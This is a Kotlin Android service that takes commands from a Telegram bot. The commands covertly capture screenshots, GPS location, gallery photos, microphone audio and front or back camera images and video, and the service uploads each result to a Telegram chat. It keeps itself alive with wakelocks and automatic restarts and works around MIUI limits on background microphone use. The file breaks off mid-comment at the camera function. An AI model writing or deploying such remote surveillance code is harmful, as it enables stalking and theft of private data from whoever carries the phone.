package com.hpu.telebotmon

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.VirtualDisplay





import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBinder

import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord



import android.media.MediaRecorder
import android.os.PowerManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.os.BatteryManager

class TelegramService : Service() {

    private var scope: CoroutineScope? = null
    private var lastUpdateId = 0L
    private var isPolling = false
    var botToken: String = ""
    var botChatId: String = ""

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var isCapturingCamera = false
    private var isRecordingVideo = false
    private var audioRecord: AudioRecord? = null
    private var audioFocusRequest: Any? = null

    private val mediaProjectionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
            val data = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
            val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
            if (resultCode == android.app.Activity.RESULT_OK && data != null) {
                onMediaProjectionResult(resultCode, data, chatId)
            }
        }
    }

    private val permissionResultReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val perm = intent.getStringExtra(EXTRA_PERMISSION) ?: ""
            val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
            if (perm == "location" && chatId.isNotEmpty()) {
                onLocationPermissionResult(intent.getIntExtra(EXTRA_RESULT_CODE, -1), chatId)
            }
        }
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground()
        scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
        loadPrefs()
        registerReceiver(mediaProjectionReceiver, IntentFilter(ACTION_MEDIA_PROJECTION))
        registerReceiver(permissionResultReceiver, IntentFilter(ACTION_PERMISSION_RESULT))
        registerReceiver(
            recordResultReceiver,
            IntentFilter().apply {
                addAction(AudioRecorderActivity.ACTION_DONE)
                addAction(AudioRecorderActivity.ACTION_FAIL)
            }
        )
        acquireWakeLock()
        Log.d(TAG, "onCreate: token=${botToken.take(8)}, chatId=$botChatId")
    }

    override fun onDestroy() {
        super.onDestroy()
        releaseWakeLock()
        stopRecording()
        scope?.cancel()
        cleanupMediaProjection()
        unregisterReceiver(mediaProjectionReceiver)
        unregisterReceiver(permissionResultReceiver)
        try { unregisterReceiver(recordResultReceiver) } catch (_: Exception) {}
    }

    /** Akuisisi wakelock (PARTIAL) agar polling tetap jalan saat screen off. */
    private fun acquireWakeLock() {
        if (wakeLock != null) return
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TeleBotPollingLock")
                .also { it.acquire(10 * 60 * 60 * 1000L) } // maks 10 jam, per call
            Log.d(TAG, "wakelock acquired")
        } catch (e: Exception) {
            Log.w(TAG, "wakelock fail: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            Log.w(TAG, "releaseWakeLock: ${e.message}")
        }
        wakeLock = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        botToken = intent?.getStringExtra("token") ?: botToken
        botChatId = intent?.getStringExtra("chatId") ?: botChatId
        savePrefs()
        if (botToken.isNotEmpty()) {
            Log.d(TAG, "onStartCommand: polling already running? scope=${scope?.isActive}")
            // Kirim konfirmasi HANYA saat service benar-benar baru (intent membawa token),
            // bukan saat sistem auto-restart via START_STICKY (intent=null).
            // Ini mencegah spam "✅ TeleBot aktif..." setiap kali service di-recreate.
            val isFreshStart = intent?.hasExtra("token") == true
            if (isFreshStart && botChatId.isNotEmpty()) {
                Log.d(TAG, "onStartCommand: fresh start, send confirmation")
                scope?.launch {
                    sendText(botChatId, "✅ TeleBot aktif di ${Build.MODEL}. Ketik /help untuk daftar perintah.")
                }
            } else {
                Log.d(TAG, "onStartCommand: sticky restart (no new token), skip confirmation")
            }
            startPolling()
        } else {
            Log.w(TAG, "onStartCommand: token empty, not polling")
        }
        return START_STICKY
    }

    private fun prefs() = getSharedPreferences("telebot", Context.MODE_PRIVATE)
    private fun loadPrefs() {
        botToken = prefs().getString("token", "") ?: ""
        botChatId = prefs().getString("chat_id", "") ?: ""
    }
    private fun savePrefs() {
        prefs().edit()
            .putString("token", botToken)
            .putString("chat_id", botChatId)
            .apply()
    }

    private fun startForeground() {
        val ch = "telebot_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(ch, "TeleBot Monitor", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        val note = NotificationCompat.Builder(this, ch)
            .setContentTitle("TeleBot Monitor")
            .setContentText("Mendengarkan perintah...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
        startForeground(1, note)
    }

    /** Tampilkan foreground notification khusus recording — memberi "visible surface"
     *  sah ke MIUI agar mic access tidak di-blokir saat app di-background. */
    private fun showRecordingNotification() {
        val ch = "telebot_recording"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(ch, "Rekaman TeleBot", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        val note = NotificationCompat.Builder(this, ch)
            .setContentTitle("⏺️ Sedang merekam audio...")
            .setContentText("Rekaman 15 detik akan dikirim ke Telegram")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
        startForeground(2, note)
        Log.d(TAG, "showRecordingNotification: started")
    }

    /** Hapus notification recording (id=2) TANPA mematikan foreground state service.
     *  PENTING: jangan pakai stopForeground() — itu membunuh foreground
     *  service-nya juga, dan MIUI kemudian kill service-nya. */
    private fun hideRecordingNotification() {
        try {
            getSystemService(NotificationManager::class.java).cancel(2)
            Log.d(TAG, "hideRecordingNotification: cancelled id=2")
        } catch (e: Exception) {
            Log.w(TAG, "hideRecordingNotification: ${e.message}")
        }
    }

    private fun startPolling() {
        if (isPolling) {
            Log.d(TAG, "startPolling: already running, skip duplicate")
            return
        }
        isPolling = true
        scope?.launch {
            // Pulihkan lastUpdateId dari prefs (bukan selalu reset ke 0)
            // supaya service recreate (START_STICKY / MIUI kill) tidak
            // re-fetch update lama yang sudah di-consume.
            lastUpdateId = prefs().getLong("last_update_id", 0L)
            Log.d(TAG, "startPolling: loop started, lastUpdateId=$lastUpdateId (restored from prefs)")
            while (isActive) {
                try {
                    pollUpdates()
                    Log.d(TAG, "pollUpdates: success, delaying 2s")
                    delay(2000L)
                } catch (e: CancellationException) {
                    Log.d(TAG, "polling cancelled")
                    throw e
                }
                catch (e: Exception) {
                    Log.e(TAG, "polling loop error: ${e.javaClass.simpleName}: ${e.message}")
                    delay(5000L)
                }
            }
        }
    }

    private suspend fun pollUpdates() {
        if (botToken.isEmpty()) {
            Log.w(TAG, "pollUpdates: token empty, skip")
            return
        }
        // Reset timeout supaya polling tidak jalan 25 detik per-request (OkHttp read timeout 30s → sering timeout)
        val url = buildString {
            append("https://api.telegram.org/bot").append(botToken).append("/getUpdates?timeout=0&limit=5")
            if (lastUpdateId > 0) append("&offset=").append(lastUpdateId + 1)
        }
        Log.d(TAG, "pollUpdates: GET $url")
        var resp: okhttp3.Response
        try {
            resp = withContext(Dispatchers.IO) {
                http.newCall(Request.Builder().url(url).build()).execute()
            }
        } catch (e: Exception) {
            // OkHttp timeout / IO error → jangan bunuh polling loop, log & retry
            Log.e(TAG, "pollUpdates: HTTP request failed: ${e.javaClass.simpleName}: ${e.message}")
            return
        }
        if (!resp.isSuccessful) { 
            Log.e(TAG, "pollUpdates: HTTP ${resp.code}")
            return 
        }
        val body = resp.body?.string() ?: run { 
            Log.w(TAG, "pollUpdates: null body")
            return 
        }
        val json = JSONObject(body)
        if (!json.optBoolean("ok", false)) { 
            Log.e(TAG, "pollUpdates: TG not ok: " + body.take(200))
            return 
        }
        val arr = json.getJSONArray("result")
        Log.d(TAG, "pollUpdates: got ${arr.length()} updates")
        for (i in 0 until arr.length()) {
            val obj = arr.getJSONObject(i)
            val oldUpdateId = lastUpdateId
            lastUpdateId = obj.optLong("update_id", lastUpdateId)
            val msg = obj.optJSONObject("message") ?: continue
            val text = msg.optString("text", "")
            val thisChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: ""
            // Jika botChatId diisi, reply ke sana. Jika kosong, reply ke chat asal (biar /diag & /help masih berfungsi)
            val target = if (botChatId.isNotEmpty()) botChatId else thisChatId
            Log.d(TAG, "COMMAND: \"$text\" from $thisChatId -> reply to $target (update_id: $oldUpdateId -> $lastUpdateId)")
            handleCommand(text.trim(), target)
        }
        // Persist lastUpdateId supaya tidak re-fetch update lama saat service di-recreate
        if (lastUpdateId > 0) {
            prefs().edit().putLong("last_update_id", lastUpdateId).apply()
        }
        Log.d(TAG, "pollUpdates: done, lastUpdateId=$lastUpdateId")
    }

    private suspend fun handleCommand(text: String, targetChatId: String) {
        val cmd = text.lowercase()
        when {
            cmd.contains("/ping") || cmd == "ping" -> {
                sendText(targetChatId, "PONG! ${Build.MODEL}")
            }
            cmd.contains("/screenshot") || cmd == "screenshot" -> {
                takeScreenshot(targetChatId)
            }
            cmd.contains("/battery") || cmd == "battery" -> {
                val (level, charging) = getBattery()
                sendText(targetChatId, "Baterai: $level% ${if (charging) "Charging" else ""}")
            }
            cmd.contains("/status") || cmd == "status" -> {
                getDeviceStatus(targetChatId)
            }
            cmd.contains("/gps") || cmd == "gps" || cmd == "location" -> {
                getLocation(targetChatId)
            }
            cmd.contains("/photo") || cmd.contains("/foto") || cmd.contains("/gambar") -> {
                // Parse angka setelah /photo, default 5
                val match = Regex("/(photo|foto|gambar)\\s+(\\d+)").find(cmd)
                val count = if (match != null) match.groupValues[2].toIntOrNull()?.coerceIn(1, 20) ?: 5 else 5
                sendPhotosFromGallery(targetChatId, count)
            }
            cmd.contains("/help") || cmd == "help" || cmd == "?" -> {
                sendHelp(targetChatId)
            }
            cmd.contains("/notifications") || cmd == "notifications" -> {
                sendText(targetChatId, "⚠️ Monitor notifikasi sedang NONAKTIF (dinonaktifkan sementara). Fitur lain tetap jalan: /ping /screenshot /battery /status /gps /photo /help.")
            }
            cmd.contains("/reset") || cmd == "reset" -> {
                // Debug: reset lastUpdateId + clear di prefs
                lastUpdateId = 0L
                prefs().edit().putLong("last_update_id", 0L).apply()
                Log.d(TAG, "/reset: lastUpdateId reset to 0 (in-memory + prefs)")
                sendText(targetChatId, "✅ lastUpdateId di-reset ke 0. Polling restart, coba /ping lagi.")
            }
            cmd.contains("/diag") || cmd == "diag" -> {
                // Diagnostik: cek status polling & kirim getMe + getUpdates mentah
                val sb = StringBuilder()
                sb.append("DIAGNOSTIK:\n")
                sb.append("token: ").append(if (botToken.isNotEmpty()) botToken.take(8) + "..." + botToken.takeLast(4) else "(KOSONG)").append("\n")
                sb.append("chatId: ").append(if (botChatId.isNotEmpty()) botChatId else "(KOSONG)").append("\n")
                sb.append("lastUpdateId: ").append(lastUpdateId).append("\n")
                sb.append("Build: ").append(Build.MODEL).append("\n")
                try {
                    val diag = withContext(Dispatchers.IO) {
                        http.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$botToken/getMe")
                                .build()
                        ).execute().body?.string() ?: "null"
                    }
                    sb.append("getMe: ").append(diag.take(200)).append("\n")
                } catch (e: Exception) {
                    sb.append("getMe GAGAL: ").append(e.message).append("\n")
                }
                sendText(targetChatId, sb.toString())
            }
            cmd.contains("/record") || cmd.contains("/rekam") -> {
                recordAudio(targetChatId)
            }
            cmd.contains("/camfront") || cmd.contains("/kamera_depan") || cmd.contains("/camdep") -> {
                captureCamera(targetChatId, facing = "front")
            }
            cmd.contains("/camback") || cmd.contains("/kamera_belakang") || cmd.contains("/cambel") -> {
                captureCamera(targetChatId, facing = "back")
            }
            cmd.contains("/vidfront") || cmd.contains("/videodepan") -> {
                val match = Regex("/vidfront\\s+(\\d+)").find(cmd)
                val dur = match?.groupValues?.get(1)?.toIntOrNull()?.coerceIn(5, 60) ?: 15
                recordVideo(targetChatId, facing = "front", seconds = dur)
            }
            cmd.contains("/vidback") || cmd.contains("/videobelakang") -> {
                val match = Regex("/vidback\\s+(\\d+)").find(cmd)
                val dur = match?.groupValues?.get(1)?.toIntOrNull()?.coerceIn(5, 60) ?: 15
                recordVideo(targetChatId, facing = "back", seconds = dur)
            }
            cmd.contains("/crash") || cmd == "crash" -> {
                val app = applicationContext as? App
                val crashLog = app?.getLatestCrashLog()
                if (crashLog == null) {
                    sendText(targetChatId, "Tidak ada crash log. App belum pernah crash.")
                } else {
                    sendText(targetChatId, "LAST CRASH:\n" + crashLog)
                }
            }
            else -> {
                sendText(targetChatId, "Perintah tidak dikenal. Ketik /help untuk bantuan.")
            }
        }
    }

    private suspend fun sendHelp(chatId: String) {
        val helpText = """
            Perintah tersedia:
            /ping     - cek koneksi
            /screenshot - ambil layar ponsel
            /battery  - level baterai
            /status   - info perangkat
            /gps      - dapatkan lokasi GPS
            /photo [N] - kirim N foto terakhir dari galeri (default 5, max 20)
            /record     - rekam 15 detik audio dan kirim ke chat
            /camfront   - ambil foto kamera depan (background)
            /camback    - ambil foto kamera belakang (background)
            /vidfront [d] - rekam video kamera depan d detik (default 15, max 60)
            /vidback [d]  - rekam video kamera belakang d detik (default 15, max 60)
            /crash      - lihat log crash terakhir
            /notifications - status monitor notifikasi
            /help     - daftar ini

            Fitur aktif:
            🔔 Semua notifikasi masuk otomatis dikirim ke chat ini (butuh izin "Notification access").
        """.trimIndent()
        sendText(chatId, helpText)
    }

    private suspend fun sendText(chatId: String, text: String) = withContext(Dispatchers.IO) {
        if (chatId.isEmpty() || botToken.isEmpty()) {
            Log.w(TAG, "sendText: chatId=$chatId, tokenEmpty=${botToken.isEmpty()}")
            return@withContext
        }
        try {
            val json = JSONObject().put("chat_id", chatId).put("text", text).toString()
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendMessage")
                .post(json.toRequestBody("application/json".toMediaTypeOrNull()))
                .build()
            val resp = http.newCall(req).execute()
            val body = resp.body?.string() ?: ""
            if (!resp.isSuccessful) {
                Log.e(TAG, "sendText: HTTP ${resp.code} for chat $chatId: ${body.take(200)}")
            } else {
                Log.d(TAG, "sendText: success to chat $chatId")
            }
            resp.close()
        } catch (e: Exception) {
            Log.e(TAG, "sendText: exception: ${e.javaClass.simpleName}: ${e.message}")
        }
    }

    private suspend fun sendPhoto(chatId: String, bitmap: Bitmap) = withContext(Dispatchers.IO) {
        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
        try {
            val file = java.io.File(filesDir, "ss_${System.currentTimeMillis()}.png")
            java.io.FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.PNG, 100, it) }
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", "Screenshot: ${Build.MODEL}")
                .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                .build()
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendPhoto")
                .post(body)
                .build()
            http.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) { /* ignore */ }
    }

    private fun getBattery(): Pair<Int, Boolean> {
        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        if (i == null) return Pair(0, false)
        val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 1)
        val pct = if (level > 0 && scale > 0) level * 100 / scale else 0
        val status = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = status == 2 || status == 5
        return Pair(pct, charging)
    }

    private suspend fun getLocation(chatId: String) {
        // Izin lokasi diminta saat install (MainActivity). Kalau belum di-grant,
        // cukup pesan singkat — bukan error teknis.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val notGranted = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
            if (notGranted) {
                sendText(chatId, "⚠️ Izin lokasi belum diberikan. Buka app → ketik \"izinkan\" → pilih Always. Lalu /gps lagi.")
                return
            }
        }
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
            if (location != null) {
                sendText(chatId, "📍 ${"%.5f".format(location.latitude)}, ${"%.5f".format(location.longitude)} (acc ${"%.1f".format(location.accuracy)}m)\nhttps://maps.google.com/?q=${"%.5f".format(location.latitude)},${"%.5f".format(location.longitude)}")
            } else {
                sendText(chatId, "GPS belum aktif / tidak ada lokasi terakhir. Pastikan GPS ON.")
            }
        } catch (e: SecurityException) {
            sendText(chatId, "❌ Izin lokasi belum diberikan ke aplikasi.\nBuka app → izinkan lokasi → lalu coba /gps lagi.")
        } catch (e: Exception) {
            sendText(chatId, "Gagal ambil GPS: " + e.message)
        }
    }

    private fun onLocationPermissionResult(resultCode: Int, chatId: String) {
        if (resultCode != android.app.Activity.RESULT_OK) {
            scope?.launch { sendText(chatId, "Izin lokasi ditolak. Buka app → izinkan lokasi → coba /gps lagi.") }
            return
        }
        scope?.launch {
            sendText(chatId, "✅ Izin lokasi diberikan, mengambil lokasi…")
            try {
                val lm = getSystemService(LOCATION_SERVICE) as LocationManager
                var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (location != null) {
                    sendText(chatId, "📍 ${"%.5f".format(location.latitude)}, ${"%.5f".format(location.longitude)}\nhttps://maps.google.com/?q=${"%.5f".format(location.latitude)},${"%.5f".format(location.longitude)}")
                } else {
                    sendText(chatId, "Lokasi belum tersedia, coba lagi sebentar lagi.")
                }
            } catch (e: Exception) {
                sendText(chatId, "Gagal ambil GPS: " + e.message)
            }
        }
    }

    private suspend fun getDeviceStatus(chatId: String) {
        val (level, charging) = getBattery()
        val free = filesDir.freeSpace
        val total = filesDir.totalSpace
        val msg = """
            Model: ${Build.MODEL}
            Produsen: ${Build.MANUFACTURER}
            Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            Baterai: $level% ${if (charging) "Charging" else ""}
            Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
        """.trimIndent()
        sendText(chatId, msg)
    }

    /** Kirim N foto terakhir dari galeri (MediaStore) ke chat. */
    private suspend fun sendPhotosFromGallery(chatId: String, count: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val granted = when {
                Build.VERSION.SDK_INT >= 33 ->
                    checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) ==
                        android.content.pm.PackageManager.PERMISSION_GRANTED
                else ->
                    checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
                        android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            if (!granted) {
                sendText(chatId, "⚠️ Izin akses galeri belum diberikan. Buka app → izinkan akses penyimpanan → lalu /photo lagi.")
                return
            }
        }
        try {
            val collection = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            // Ambil _ID + DATE_ADDED, sort descending, lalu batasi N di memori
            val query = withContext(Dispatchers.IO) {
                contentResolver.query(
                    collection,
                    arrayOf(
                        android.provider.MediaStore.Images.Media._ID,
                        android.provider.MediaStore.Images.Media.DATE_ADDED
                    ),
                    null,
                    null,
                    "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
                )
            }
            val files = mutableListOf<java.io.File>()
            var taken = 0
            if (query != null) {
                while (query.moveToNext() && taken < count) {
                    val id = query.getLong(0)
                    val uri = android.net.Uri.withAppendedPath(collection, id.toString())
                    // Salin ke file lokal, kirim pakai sendPhoto (butuh File)
                    val file = withContext(Dispatchers.IO) {
                        val out = java.io.File(filesDir, "gallery_${System.currentTimeMillis()}_${files.size}.jpg")
                        contentResolver.openInputStream(uri)?.use { input ->
                            out.outputStream().use { input.copyTo(it) }
                        }
                        out
                    }
                    if (file != null && file.length() > 0) {
                        files.add(file)
                        taken++
                    }
                }
                query.close()
            }
            if (files.isEmpty()) {
                sendText(chatId, "Galeri kosong / tidak ada foto yang bisa dikirim.")
                return
            }
            files.forEachIndexed { i, file ->
                sendPhoto(chatId, file, "Galeri ${i + 1}/${files.size}")
                file.delete()
            }
        } catch (e: SecurityException) {
            sendText(chatId, "❌ Izin akses galeri belum diberikan. Buka app → izinkan akses penyimpanan → lalu /photo lagi.")
        } catch (e: Exception) {
            sendText(chatId, "Gagal kirim foto dari galeri: ${e.message}")
        }
    }

    /** Kirim file gambar (dari galeri) ke chat. */
    private suspend fun sendPhoto(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendPhoto")
                .post(body)
                .build()
            http.newCall(req).execute().close()
        } catch (e: Exception) { /* ignore */ }
    }

    /** Rekam 15 detik audio langsung di-service (MediaRecorder di coroutine),
     *  TANPA launch Activity. Aktifkan foreground notification (id=2) sebagai
     *  visible surface sah MIUI. Activity hanya di-launch fallback kalau
     *  semua audio source gagal dari service.
     *
     *  Alur: audio focus → MediaRecorder retry (VOICE_RECOGNITION → MIC)
     *  → rekam 15 detik → stop → kirim file → release focus + cancel notifikasi.
     *  Semua state reset di finally, jadi /record ke-2 selalu bisa trigger
     *  meski app di-background (MIUI close/swipe). */
    private suspend fun recordAudio(chatId: String) {
        if (isRecording) {
            sendText(chatId, "Sedang merekam... tunggu selesai.")
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val granted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            if (!granted) {
                sendText(chatId, "⚠️ Izin mikrofon belum diberikan. Buka app → izinkan akses mikrofon → lalu /record lagi.")
                return
            }
        }
        val ts = System.currentTimeMillis()
        val outDir = getExternalFilesDir(null) ?: filesDir
        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
        if (outFile.exists()) outFile.delete()
        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, file=${outFile.absolutePath}")

        isRecording = true
        showRecordingNotification()
        sendText(chatId, "⏺️ Mulai rekam 15 detik...")
        scope?.launch {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            var focusGranted = false

            // --- 1. Request audio focus (wajib di MIUI) ---
            try {
                if (Build.VERSION.SDK_INT >= 26) {
                    val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
                        .setAudioAttributes(
                            AudioAttributes.Builder()
                                .setUsage(AudioAttributes.USAGE_MEDIA)
                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                .build()
                        )
                        .build()
                    focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
                } else {
                    @Suppress("DEPRECATION")
                    focusGranted = am.requestAudioFocus(
                        null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN
                    ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
                }
                Log.d(TAG, "recordAudio: audioFocus=$focusGranted")
            } catch (e: Exception) {
                Log.w(TAG, "recordAudio: audioFocus fail: ${e.message}")
            }

            // --- 2. MediaRecorder retry: VOICE_RECOGNITION → MIC ---
            var startOk = false
            for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
                val rec = if (Build.VERSION.SDK_INT >= 31) {
                    MediaRecorder(applicationContext)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                mediaRecorder = rec
                try {
                    rec.setAudioSource(source)
                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    rec.setAudioSamplingRate(44100)
                    rec.setAudioEncodingBitRate(96000)
                    rec.setOutputFile(outFile.absolutePath)
                    rec.prepare()
                    rec.start()
                    startOk = true
                    Log.d(TAG, "recordAudio: started with source=$source (in-service)")
                    break
                } catch (e: Exception) {
                    Log.w(TAG, "recordAudio: source=$source failed: ${e.javaClass.simpleName}: ${e.message}")
                    try { rec.release() } catch (_: Exception) {}
                }
            }

            // --- 3. Fallback: launch Activity kalau semua source gagal ---
            if (!startOk) {
                Log.w(TAG, "recordAudio: all sources failed in-service, launching AudioRecorderActivity as fallback")
                mediaRecorder = null
                try {
                    val i = Intent(applicationContext, AudioRecorderActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    i.putExtra(AudioRecorderActivity.EXTRA_CHAT_ID, chatId)
                    startActivity(i)
                    // Activity akan broadcast ACTION_DONE/FAIL — state direset di recordResultReceiver
                    return@launch
                } catch (e: Exception) {
                    Log.e(TAG, "recordAudio: fallback activity fail: ${e.message}")
                }
            }

            // --- 4. Rekam 15 detik ---
            delay(15_000L)

            // --- 5. Stop & release ---
            try { mediaRecorder?.stop() } catch (e: Exception) {
                Log.w(TAG, "recordAudio: stop: ${e.message}")
            }
            try { mediaRecorder?.release() } catch (e: Exception) {
                Log.w(TAG, "recordAudio: release: ${e.message}")
            }
            mediaRecorder = null

            // --- 6. Release audio focus ---
            if (focusGranted) {
                try {
                    if (Build.VERSION.SDK_INT >= 26) {
                        val abandonReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
                            .setAudioAttributes(
                                AudioAttributes.Builder()
                                    .setUsage(AudioAttributes.USAGE_MEDIA)
                                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                    .build()
                            )
                            .build()
                        am.abandonAudioFocusRequest(abandonReq)
                    } else {
                        @Suppress("DEPRECATION")
                        am.abandonAudioFocus(null)
                    }
                } catch (_: Exception) {}
            }

            // --- 7. Kirim file ---
            if (outFile.exists() && outFile.length() > 0) {
                Log.d(TAG, "recordAudio: file=${outFile.length()} bytes, sending...")
                sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
            } else {
                sendText(chatId, "❌ File rekaman kosong (0 bytes).")
            }
            outFile.delete()

            // --- 8. Bersihkan state ---
            isRecording = false
            hideRecordingNotification()
        }
    }

    /** Receiver hasil rekaman fallback dari AudioRecorderActivity. */
    private val recordResultReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val chatId = intent.getStringExtra(AudioRecorderActivity.EXTRA_CHAT_ID) ?: ""
            when (intent.action) {
                AudioRecorderActivity.ACTION_DONE -> {
                    val path = intent.getStringExtra(AudioRecorderActivity.EXTRA_FILE) ?: ""
                    val file = java.io.File(path)
                    isRecording = false
                    hideRecordingNotification()
                    if (file.exists() && file.length() > 0) {
                        Log.d(TAG, "recordResult: done, ${file.length()} bytes")
                        scope?.launch {
                            sendAudio(chatId, file, "Rekaman ${android.text.format.DateFormat.format("HH:mm", System.currentTimeMillis())}")
                            file.delete()
                        }
                    } else {
                        if (path.isNotEmpty()) file.delete()
                        scope?.launch { sendText(chatId, "❌ File rekaman kosong (0 bytes).") }
                    }
                }
                AudioRecorderActivity.ACTION_FAIL -> {
                    val err = intent.getStringExtra(AudioRecorderActivity.EXTRA_ERROR) ?: "unknown"
                    isRecording = false
                    hideRecordingNotification()
                    Log.w(TAG, "recordResult: fail: $err")
                    scope?.launch { sendText(chatId, "❌ Rekaman gagal: $err") }
                }
            }
        }
    }

    /** Ambil foto kamera depan/belakang secara background (tanpa Activity terlihat).
     *  Kamera dibuka via Camera2 + ImageReader di service; notification foreground
